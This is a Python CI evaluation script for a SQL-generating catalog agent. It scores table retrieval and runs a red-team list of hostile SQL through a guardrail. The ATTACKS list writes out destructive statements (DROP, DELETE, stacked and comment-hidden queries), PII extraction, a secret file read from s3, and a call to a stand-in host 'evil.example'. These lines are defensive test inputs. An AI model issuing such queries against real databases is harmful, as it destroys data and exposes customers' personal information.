"""Offline evaluation: retrieval quality + guardrail red-team suite.

Run in CI on every change to prompts, catalog docs or guard rules:

    catalog-agent-evals                      # bundled example catalog
    catalog-agent-evals path/to/catalog.yaml
"""

from __future__ import annotations

import sys

from catalog_agent.catalog import Catalog, load_catalog
from catalog_agent.guardrails import GuardrailError, SqlGuard
from catalog_agent.retriever import BM25Retriever

RETRIEVAL_CASES: list[tuple[str, set[str]]] = [
    ("What was total dining spend in Japan last month?", {"fin.gold.card_spend_daily"}),
    ("Which merchant categories have the most transactions?", {"fin.gold.card_spend_daily"}),
    ("How many affluent cardmembers have more than 10 years tenure?", {"fin.gold.customer_segments"}),
    ("Average membership rewards points balance by month", {"fin.gold.rewards_points_balance"}),
    ("points earned in October", {"fin.gold.rewards_points_balance"}),
    # needs a join: both tables must be in the context window
    ("spend by customer segment", {"fin.gold.card_spend_daily", "fin.gold.customer_segments"}),
]

ATTACKS: list[tuple[str, str]] = [
    ("DROP TABLE fin.gold.card_spend_daily", "ddl"),
    ("SELECT 1; DELETE FROM fin.gold.card_spend_daily", "stacked statement"),
    ("SELECT 1 /* harmless */ ; DROP TABLE x", "comment-hidden stacked statement"),
    ("WITH x AS (SELECT 1) DELETE FROM fin.gold.card_spend_daily", "dml inside CTE"),
    ("SELECT * FROM fin.silver.card_txn", "uncertified table"),
    ("SELECT card_number FROM fin.silver.card_txn", "pii from uncertified table"),
    ("SELECT email FROM fin.gold.customer_segments", "pii column"),
    ("SELECT c.EMAIL FROM fin.gold.customer_segments c", "pii column, aliased, upper-case"),
    ("SELECT * FROM fin.gold.customer_segments", "star over pii"),
    ("SELECT * FROM read_files('s3://bucket/secret/')", "file table function"),
    ("SELECT http_request('https://evil.example', 'x')", "network function"),
    ("SELECT * FROM card_spend_daily", "unqualified table"),
    ("SELECT a.account_id FROM fin.gold.card_spend_daily a, fin.prod.secrets b", "comma join to unknown table"),
    ("SELECT x FROM (SELECT * FROM fin.hr.salaries) s", "unknown table in subquery"),
    ("SELECT account_id FROM fin.gold.card_spend_daily UNION SELECT full_name FROM fin.gold.customer_segments",
     "pii via union"),
    ("INSERT INTO fin.gold.card_spend_daily SELECT * FROM fin.gold.card_spend_daily", "insert"),
    ("OPTIMIZE fin.gold.card_spend_daily", "maintenance command"),
]

SAFE: list[str] = [
    "SELECT mcc_group, sum(spend_usd) AS spend FROM fin.gold.card_spend_daily GROUP BY mcc_group",
    "SELECT 'please DROP me' AS note, count(*) FROM fin.gold.customer_segments",
    "WITH s AS (SELECT account_id, segment FROM fin.gold.customer_segments) "
    "SELECT segment, count(*) FROM s GROUP BY segment",
    "SELECT d.country, sum(d.spend_usd) FROM fin.gold.card_spend_daily d "
    "JOIN fin.gold.customer_segments c ON d.account_id = c.account_id WHERE c.segment = 'hnw' GROUP BY d.country",
]


def run(catalog: Catalog) -> dict[str, float]:
    retriever = BM25Retriever(catalog)
    recall = sum(exp <= {d.name for d, _ in retriever.search(q, 3)} for q, exp in RETRIEVAL_CASES)
    guard = SqlGuard(catalog)
    blocked = 0
    for sql, label in ATTACKS:
        try:
            guard.check(sql)
            print(f"  LEAK  {label}: {sql}")
        except GuardrailError:
            blocked += 1
    false_blocks = 0
    for sql in SAFE:
        try:
            guard.check(sql)
        except GuardrailError as e:
            false_blocks += 1
            print(f"  FALSE BLOCK: {sql} -> {e}")
    return {
        "retrieval_recall@3": recall / len(RETRIEVAL_CASES),
        "attack_block_rate": blocked / len(ATTACKS),
        "safe_query_pass_rate": 1 - false_blocks / len(SAFE),
    }


def main(argv: list[str] | None = None) -> int:
    from catalog_agent.catalog import example_catalog_path

    argv = sys.argv[1:] if argv is None else argv
    metrics = run(load_catalog(argv[0] if argv else example_catalog_path()))
    for k, v in metrics.items():
        print(f"{k:24s} {v:.0%}")
    return 0 if metrics["attack_block_rate"] == 1.0 and metrics["safe_query_pass_rate"] == 1.0 else 1


if __name__ == "__main__":
    sys.exit(main())
